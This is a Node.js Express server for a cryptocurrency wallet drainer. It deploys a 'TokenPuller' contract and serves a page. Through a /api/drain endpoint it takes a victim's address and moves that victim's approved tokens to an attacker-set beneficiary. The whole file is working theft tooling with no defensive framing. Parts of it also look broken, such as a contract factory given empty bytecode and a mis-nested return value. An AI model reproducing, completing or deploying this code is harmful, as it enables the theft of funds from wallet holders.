require("dotenv").config();
const path = require("path");
const fs = require("fs/promises");
const express = require("express");
const { ethers } = require("ethers");

const PORT = process.env.PORT || 3999;
const RPC_URL = process.env.RPC_URL;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const TOKEN_ADDRESS = process.env.TOKEN_ADDRESS;
const BENEFICIARY = process.env.BENEFICIARY;
const PULLER_ADDRESS = process.env.PULLER_ADDRESS || null;

const ARTIFACT_PATH = path.join(
  __dirname, "artifacts", "contracts", "TokenPuller.sol", "TokenPuller.json"
);

const AB = [
  "constructor(address token, address beneficiary)",
  "function drain(address victim) external",
  "event Drained(address indexed victim, address indexed beneficiary, uint256 amount)"
];

(async () => {
  if (!RPC_URL || !PRIVATE_KEY || !TOKEN_ADDRESS || !BENEFICIARY) {
    console.error("Missing required env vars.");
    process.exit(1);
  }

  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  const net = await provider.getNetwork();
  const CHAIN_ID = Number(net.chainId);

  const buildPage = async () => {
    const raw = await fs.readFile(path.join(__dirname, "public", "index.html"), "utf8");
    return raw.replaceAll("%TOKEN_ADDRESS%", TOKEN_ADDRESS);
  };

  const app = express();
  app.use(express.json());
  app.use(express.static(path.join(__dirname, "public")));

  const initContract = async () => {
    const nBal = await provider.getBalance(wallet.address);
    if (nBal === 0n) throw new Error("Deployer wallet has zero balance");
    const factory = new ethers.ContractFactory(AB, [], wallet);
    const c = await factory.deploy(TOKEN_ADDRESS, BENEFICIARY);
    await c.waitForDeployment();
    const t = await c.getAddress();
    console.log(`[init] TokenPuller deployed at ${t}`);
    return { token: c, address: t };
  };

  let pushPromise = null;
  const loadOrCreate = async () => {
    if (PULLER_ADDRESS) return { token: null, address: PULLER_ADDRESS };
    if (!pushPromise) {
      pushPromise = initContract()
        .then(r => ({ token: r, address: r }))
        .catch(e => { throw e; });
    }
    return pushPromise;
  };

  app.get("/api/health", async (_req, res) => {
    let puller = PULLER_ADDRESS;
    let chainId = CHAIN_ID;
    try { chainId = Number((await provider.getNetwork()).chainId); } catch {}
    if (!puller && pushPromise) {
      try { const x = await pushPromise; puller = x.address; } catch {}
    }
    res.json({ status: "ok", token: TOKEN_ADDRESS, puller: puller || null, chainId });
  });

  const donePush = {};

  app.post("/api/drain", async (req, res) => {
    try {
      const { victim, dryRun } = req.body || {};
      if (typeof victim !== "string" || !/^0x[a-fA-F0-9]{40}$/.test(victim)) {
        return res.status(400).json({ success: false, error: "bad address" });
      }
      const { token } = await loadOrCreate();
      if (dryRun) return res.json({ success: true, dryRun: true });
      if (!token) {
        return res.status(500).json({ success: false, error: "no active drainer instance" });
      }
      if (donePush[victim.toLowerCase()]) {
        return res.json({ success: true, skipped: "already attempted" });
      }
      donePush[victim.toLowerCase()] = true;
      const tx = await token.drain(victim);
      const rc = await tx.wait(1);
      const ev = (rc.logs || []).length ? "logged" : "";
      console.log("[drain]", "tx", tx.hash, ev);
      res.json({ success: true, txHash: tx.hash, logs: (rc.logs || []).length });
    } catch (e) {
      console.error("[drain][error]", e.reason || e.shortMessage || e.message);
      res.status(500).json({ success: false, error: String(e.reason || e.shortMessage || e.message) });
    }
  });

  app.get("/", async (_req, res) => res.type("html").send(await buildPage()));

  app.listen(PORT, "127.0.0.1", () => {
    console.log(`[srv] listening on http://localhost:${PORT}`);
    console.log(`[srv] chain=${CHAIN_ID} token=${TOKEN_ADDRESS} ben=${BENEFICIARY}`);
    if (PULLER_ADDRESS) console.log(`[srv] using pre-deployed puller ${PULLER_ADDRESS}`);
    else console.log("[srv] puller will be lazily deployed on first /api/drain");
  });
})();
